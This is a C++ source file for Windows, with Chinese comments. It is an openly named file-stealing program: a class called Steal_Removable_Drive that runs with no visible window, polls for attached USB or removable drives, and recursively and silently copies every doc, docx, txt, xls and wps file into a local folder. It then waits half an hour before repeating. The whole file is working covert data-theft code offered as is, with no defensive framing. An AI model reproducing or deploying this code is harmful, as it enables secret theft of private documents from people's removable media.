#include "StdAfx.h"
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <direct.h>
#include <process.h>

#define Name_Length 300
#define Path_Length 2000
#define Suffix_Len 20
#define Target_File_Type {"doc","docx","txt","xls","wps",NULL}

#define Directory_Path "D:\\123"    //保存文件的路径

#pragma comment(lib, "winmm.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

using namespace std;

class Steal_Removable_Drive
{
public:
    Steal_Removable_Drive();
    int Check_Directory(char *path);
    char *Check_Removable_Drive(char *Removable_Drive,int Length);
private:
    char Drives[200],CurrDrive[100];
};

Steal_Removable_Drive::Steal_Removable_Drive()
{
    memset(Drives,NULL,sizeof(Drives));
    memset(CurrDrive,NULL,sizeof(CurrDrive));
}

int Steal_Removable_Drive::Check_Directory(char *path)
{
    //返回1表示存在此目录，返回0表示不存在
    WIN32_FIND_DATA FileData;
    HANDLE hFile=NULL;
    if(FindFirstFile(path,&FileData)==INVALID_HANDLE_VALUE)
        return 0;
    if(FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        return 1;
    else
        return 0;
}

char *Steal_Removable_Drive::Check_Removable_Drive(char * Removable_Drive,int Length)
{
    char *p=NULL;
    int k,flag=0;
    unsigned long int i;
    memset(Removable_Drive,NULL,Length);
    GetLogicalDriveStrings(sizeof(Drives),Drives);    //获取本机所有磁盘列表
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(Drives[i]!=NULL)
        {
            k=0;
            *p=Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            //printf("%s\n",CurrDrive);
            if(GetDriveType(CurrDrive)==DRIVE_REMOVABLE)
            {
                flag=1;
                //printf("检测到移动磁盘:%s\n",CurrDrive);
                strcat(Removable_Drive,CurrDrive);
                strcat(Removable_Drive,",");
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    if(flag)
    {
        Removable_Drive[strlen(Removable_Drive)-1]=NULL;
        return Removable_Drive;        //返回储存有移动磁盘盘符的字符串指针
    }
    else
        return NULL;   //没有检测到移动磁盘
}




typedef struct File_Infomation
{
    char file[Name_Length];
    char path[Path_Length];
} File_Info;

int Copy_File(void *Paramter)
{
    //printf("Create Copy_File Function Success!\n");

    FILE *Source_File=NULL,*New_File=NULL;
    char Buff[1024],Sour_file_path[Path_Length],New_file_path[Path_Length],*p=NULL;
    int bytes=0,Length=0;
    File_Info tmp=*(File_Info *)Paramter;

    memset(Sour_file_path,NULL,sizeof(Sour_file_path));
    memset(Buff,NULL,sizeof(Buff));
    memset(New_file_path,NULL,sizeof(New_file_path));

    strcat(Sour_file_path,tmp.path);
    if(Sour_file_path[strlen(Sour_file_path)-1]!='\\') Sour_file_path[strlen(Sour_file_path)]='\\';
    strcat(Sour_file_path,tmp.file);
    //printf("打开文件:%s\n",Sour_file_path);
    if((Source_File=fopen(Sour_file_path,"rb"))==NULL) _endthread();
    strcat(New_file_path,Directory_Path);
    if(New_file_path[strlen(New_file_path)-1]!='\\') New_file_path[strlen(New_file_path)]='\\';
    strcat(New_file_path,tmp.file);
    //printf("打开文件:%s\n",New_file_path);
    if((New_File=fopen(New_file_path,"wb"))==NULL) _endthread();

    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Source_File))>0)
    {
        fwrite(Buff,sizeof(char),bytes,New_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    //printf("复制文件:%s\n",Sour_file_path);
    fflush(New_File);

    fclose(New_File);
    fclose(Source_File);
    return 1;
}

int Traversal_Directory(char *path_t,char *Suffix_t)
{
    File_Info Paramter;    //存放将要复制的文件的信息
    char folder[Name_Length],file[Name_Length],path[Path_Length],Paramter_path[Path_Length],Traversal_Dir_Path[Path_Length];
    char Suffix[Suffix_Len],*file_type_tmp="\\*.%s",file_type[Suffix_Len];
    WIN32_FIND_DATA FindFileData;

    memset(folder,NULL,sizeof(folder));
    memset(file,NULL,sizeof(file));
    memset(path,NULL,sizeof(path));
    memset(Traversal_Dir_Path,NULL,sizeof(Traversal_Dir_Path));
    memset(Suffix,NULL,sizeof(Suffix));
    memset(&Paramter,NULL,sizeof(Paramter));
    memset(file_type,NULL,sizeof(file_type));
    memset(Paramter_path,NULL,sizeof(Paramter_path));

    strcat(Suffix,Suffix_t);
    strcat(path,path_t);
    strcat(Paramter_path,path);
    strcat(Traversal_Dir_Path,path);
    //表示不遍历此目录
    if(!strcmp(Traversal_Dir_Path,".") || !strcmp(Traversal_Dir_Path,"..") || Traversal_Dir_Path[strlen(Traversal_Dir_Path)-1]=='.') return 0;

    sprintf(file_type,file_type_tmp,Suffix);    //格式化指定的文件类型
    if(Traversal_Dir_Path[strlen(Traversal_Dir_Path)-1]=='\\') Traversal_Dir_Path[strlen(Traversal_Dir_Path)-1]=NULL;
    strcat(Traversal_Dir_Path,"\\*.*");

    //遍历出当前目录下所有的文件夹
    //printf("Check_Dir_Path:%s\n",Check_Dir_Path);
    //system("pause");
    HANDLE hFind=FindFirstFile(Traversal_Dir_Path,&FindFileData);  //读取目录下第一个文件
    if(hFind==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;   //表示当前目录下为空
    }
    do
    {
        if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件夹
            memset(folder,NULL,sizeof(folder));
            strcat(folder,FindFileData.cFileName);
            //printf("folder:%s\n",folder);
            if(folder[strlen(folder)-1]=='.') continue;
            if(Paramter_path[strlen(Paramter_path)-1]!='\\') Paramter_path[strlen(Paramter_path)]='\\';
            strcat(Paramter_path,folder);
            //printf("遍历子目录:%s\n",Paramter_path);
            Traversal_Directory(Paramter_path,Suffix);    //递归

            memset(Paramter_path,NULL,sizeof(Paramter_path));
            strcat(Paramter_path,path);
        }
    }
    while(FindNextFile(hFind,&FindFileData));

FindClose(hFind);

    //查找当前目录下的指定文件
    strcat(path,file_type);

    if((hFind=FindFirstFile(path,&FindFileData))==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;
    }
    do
    {
        if(FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件
            strcat(file,FindFileData.cFileName);
            strcat(Paramter.file,file);
            memcpy(Paramter.path,path,strlen(path)-strlen(file_type));
            Copy_File((void *)&Paramter);
            Sleep(1);
            memset(file,NULL,sizeof(file));
            memset(&Paramter,NULL,sizeof(Paramter));
        }
    }
    while(FindNextFile(hFind,&FindFileData));

    FindClose(hFind);
    return 1;
}

void Copy_File_Thread(void *Paramter)
{
    //printf("Create Thread success!\n");
    class Steal_Removable_Drive tmp;
    char Target_Drive[100];
    char *Suffix[]= Target_File_Type;
    unsigned long int i;

    memset(Target_Drive,NULL,sizeof(Target_Drive));
    strcat(Target_Drive,(char *)Paramter);

    for(i=0; Suffix[i]!=NULL; i++)
        Traversal_Directory(Target_Drive,Suffix[i]);
    _endthread();
}

int main(int argc,char *argv[])
{
    class Steal_Removable_Drive func;
    int Sleep_Flag=0;
    unsigned int i;
    int Removable_Drive_String_Len=0,INVALID_REMOVABLE=0,INVALID_REMOVABLE_LAST=0;
    char Removable_Drive[100],Target_Drive[10],*p=NULL;
    time_t Sleep_Time,Now_Time;

    memset(Removable_Drive,NULL,sizeof(Removable_Drive,sizeof(Removable_Drive)));
    memset(Target_Drive,NULL,sizeof(Target_Drive));

    while(1)
    {
        Sleep(1000);              //每读取一次磁盘后程序暂停一秒防止CPU使用率过高
        if(func.Check_Removable_Drive(Removable_Drive,sizeof(Removable_Drive))!=NULL)
        {
            //printf("检测到移动磁盘:%s\n",Removable_Drive);

            if(strlen(Removable_Drive)!=Removable_Drive_String_Len)
            {
                //若不相等则说明可移动磁盘发生了变化
                Sleep_Flag=0;               //睡眠指令结束
                Removable_Drive_String_Len=strlen(Removable_Drive);
            }

            for(i=0,INVALID_REMOVABLE=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的可移动磁盘
                if(Removable_Drive[i]!=',' && Removable_Drive[i]!=NULL)
                {
                    *p=Removable_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
                    if(!GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0)) INVALID_REMOVABLE++;
                }
                if(Removable_Drive[i]==NULL) break;
            }

            if(INVALID_REMOVABLE!=INVALID_REMOVABLE_LAST)
            {
                INVALID_REMOVABLE_LAST=INVALID_REMOVABLE;
                Sleep_Flag=0;
            }

            if(Sleep_Flag)
            {
                Now_Time=time(NULL);
                //printf("Stand By...%ld\n",Now_Time-Sleep_Time);
                if(Now_Time-Sleep_Time>=1800)       //时隔半小时
                    Sleep_Flag=0;       //解除睡眠指令
                else
                    continue;
            }

            if(func.Check_Directory(Directory_Path)==0)
   {
                if(mkdir(Directory_Path)!=0) return 0;
   }

            for(i=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的可移动磁盘
                if(Removable_Drive[i]!=',' && Removable_Drive[i]!=NULL)
                {
                    *p=Removable_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
                    //printf("检测可移动磁盘%s\n",Target_Drive);
                    //system("pause");

                    if(GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0))     //判断设备是否就绪
                    {
                        //printf("%s已就绪\n",Target_Drive);
                        _beginthread(Copy_File_Thread,0,(void *)Target_Drive);
                        Sleep(1);
                    }
                    else
                        ;//printf("%s未就绪\n",Target_Drive);

                    Sleep_Flag=1;             //程序进入睡眠
                    Sleep_Time=time(NULL);     //从复制完文件后开始计时
                    memset(Target_Drive,NULL,sizeof(Target_Drive));
                }
                if(Removable_Drive[i]==NULL)
                    break;
            }
        }
    }
    return 0;
}